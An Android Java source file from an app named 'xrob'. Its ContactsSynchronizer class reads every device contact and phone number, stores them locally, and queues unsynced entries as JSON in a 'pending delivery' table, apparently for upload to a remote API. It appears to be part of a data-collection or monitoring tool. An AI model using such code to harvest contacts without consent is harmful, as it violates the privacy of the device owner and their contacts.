package com.theah64.xrob.asynctasks;

import android.content.Context;
import android.database.Cursor;
import android.provider.ContactsContract;
import android.util.Log;

import com.theah64.xrob.database.Contacts;
import com.theah64.xrob.database.PendingDeliveries;
import com.theah64.xrob.database.PhoneNumbers;
import com.theah64.xrob.models.Contact;
import com.theah64.xrob.models.PendingDelivery;
import com.theah64.xrob.utils.APIRequestBuilder;
import com.theah64.xrob.utils.APIRequestGateway;
import com.theah64.xrob.utils.APIResponse;
import com.theah64.xrob.utils.OkHttpUtils;
import com.theah64.xrob.utils.Xrob;

import org.acra.ACRA;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.IOException;
import java.util.List;
import java.util.Locale;

import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.Request;
import okhttp3.Response;

/**
 * Created by theapache64 on 12/9/16.
 */
public class ContactsSynchronizer extends BaseJSONPostNetworkAsyncTask<Void> {

    private static final String X = ContactsSynchronizer.class.getSimpleName();

    public ContactsSynchronizer(Context context, String apiKey) {
        super(context, apiKey);
        Log.d(X, "Starting contact sync... 3");
    }

    @Override
    protected synchronized Void doInBackground(String... string) {

        Log.d(X, "Starting contact sync... 4");

        final boolean isSyncNeeded = refreshContacts(getContext());

        if (isSyncNeeded) {

            Log.d(X, "Starting contact sync... 6");

            new APIRequestGateway(getContext(), new APIRequestGateway.APIRequestGatewayCallback() {

                @Override
                public void onReadyToRequest(String apiKey) {
                    Log.d(X, "Starting contact sync... 7");
                    push(getContext(), getApiKey());
                }

                @Override
                public void onFailed(String reason) {
                    Log.e(X, "Failed to sync contacts : " + reason);
                }

            });
        } else {
            Log.d(X, "Starting contact sync... 8");
        }


        return null;
    }

    /**
     * To sync system contacts to xrob.contacts
     *
     * @return boolean true if sync needed
     */
    private static synchronized boolean refreshContacts(Context context) {

        Log.d(X, "Starting contact sync... 5");

        Log.i(X, "--------------------------------------");
        Log.i(X, "Refreshing contacts....");

        final Contacts contactsTable = Contacts.getInstance(context);
        final PhoneNumbers phoneNumbersTable = PhoneNumbers.getInstance(context);

        int totalAddedContacts = 0, totalAddedNumbers = 0, totalEditedContacts = 0;

        Log.i(X, "contactsTable and phoneNumbersTable are initialized...");

        final Cursor cCur = context.getContentResolver().query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null);

        Log.i(X, "Querying contacts....");

        if (cCur != null && cCur.moveToFirst()) {

            Log.d(X, cCur.getCount() + " contacts found");


            do {

                final String androidContactId = cCur.getString(cCur.getColumnIndex(ContactsContract.Contacts._ID));
                final String name = cCur.getString(cCur.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
                Contact contact = contactsTable.get(Contacts.COLUMN_ANDROID_CONTACT_ID, androidContactId);

                if (contact == null) {

                    contact = new Contact(null, androidContactId, name, null, false);
                    final long rowId = contactsTable.add(contact);

                    if (rowId != -1) {
                        totalAddedContacts++;
                        contact.setId(String.valueOf(rowId));
                    } else {
                        throw new IllegalArgumentException("Failed to add contact " + contact);
                    }

                } else {

                    if (!contact.getName().equals(name)) {

                        Log.d(X, "Contact name changed from : " + contact.getName() + " to " + name);

                        final boolean isEdited = contactsTable.update(Contacts.COLUMN_ANDROID_CONTACT_ID, androidContactId, Contacts.COLUMN_NAME, name);
                        totalEditedContacts++;

                        if (!isEdited) {
                            throw new IllegalArgumentException("Failed to change name");
                        }

                    }

                }

                final boolean hasPhoneNumbers = cCur.getInt(cCur.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER)) > 0;

                if (hasPhoneNumbers) {


                    final Cursor pCur = context.getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
                            new String[]{androidContactId}, null);

                    if (pCur != null && pCur.moveToFirst()) {


                        do {

                            final String phone = pCur.getString(pCur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                            final String phoneType = Contact.PhoneNumber.getTypeString(pCur.getInt(pCur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.TYPE)));

                            final boolean isExist = phoneNumbersTable.get(PhoneNumbers.COLUMN_PHONE_NUMBER, phone, PhoneNumbers.COLUMN_CONTACT_ID, contact.getId()) != null;

                            if (!isExist) {

                                totalAddedNumbers++;
                                final boolean isAdded = phoneNumbersTable.add(new Contact.PhoneNumber(contact.getId(), phone, phoneType)) != -1;

                                //Contact need to be synced
                                contactsTable.update(Contacts.COLUMN_ID, contact.getId(), Contacts.COLUMN_IS_SYNCED, "0");

                                if (!isAdded) {
                                    throw new IllegalArgumentException("Failed to add phone number of " + name + " - " + phone);
                                }

                            }

                        } while (pCur.moveToNext());

                    }


                    if (pCur != null) {
                        pCur.close();
                    }

                }


            } while (cCur.moveToNext());
        }

        if (cCur != null) {
            cCur.close();
        }

        Log.d(X, "Total added contacts : " + totalAddedContacts);
        Log.d(X, "Total added numbers : " + totalAddedNumbers);
        Log.d(X, "Total edited contacts : " + totalEditedContacts);

        Log.d(X, "--------------------------------------");

        return (totalAddedContacts + totalAddedNumbers + totalEditedContacts) > 0;

    }

    private static synchronized void push(final Context context, final String apiKey) {
        Log.d(X, "Starting contact sync... 9");
        final Contacts contactsTable = Contacts.getInstance(context);
        final List<Contact> unSyncedContacts = contactsTable.getNonSyncedContacts();

        if (unSyncedContacts != null) {

            final JSONArray jaContacts = new JSONArray();

            Log.d(X, unSyncedContacts.size() + " need to be synced!");

            try {

                //Looping through each contact
                for (final Contact contact : unSyncedContacts) {

                    final JSONObject joContact = new JSONObject();
                    joContact.put(Contacts.COLUMN_NAME, contact.getName());
                    joContact.put(Contacts.COLUMN_ANDROID_CONTACT_ID, contact.getAndroidContactId());

                    if (contact.getPhoneNumbers() != null) {

                        final JSONArray jaPhoneNumbers = new JSONArray();

                        for (final Contact.PhoneNumber phoneNumber : contact.getPhoneNumbers()) {

                            final JSONObject joPhoneNumber = new JSONObject();

                            joPhoneNumber.put(PhoneNumbers.COLUMN_PHONE_NUMBER, phoneNumber.getPhone());
                            joPhoneNumber.put(PhoneNumbers.COLUMN_PHONE_TYPE, phoneNumber.getPhoneType());

                            jaPhoneNumbers.put(joPhoneNumber);
                        }


                        joContact.put("phone_numbers", jaPhoneNumbers);
                    }

                    jaContacts.put(joContact);
                }

                final String message = String.format(Locale.getDefault(), "%d contact(s) retrieved", jaContacts.length());
                final String data = jaContacts.toString();

                final boolean isAdded = PendingDeliveries.getInstance(context).add(new PendingDelivery(
                        null,
                        false,
                        Xrob.DATA_TYPE_CONTACTS,
                        data,
                        message
                )) != -1;

                if (isAdded) {
                    //Synced data collected
                    contactsTable.setAllContactsAndNumbersSynced();
                    //new PendingDeliverySynchronizer(context, apiKey).execute();
                } else {
                    //TSH
                    ACRA.getErrorReporter().handleException(new Exception("Failed to save contacts to pending delivery system"));
                }


            } catch (JSONException e) {
                e.printStackTrace();
            }
        } else {
            Log.i(X, "Every contacts are synced :)");
        }
    }

}
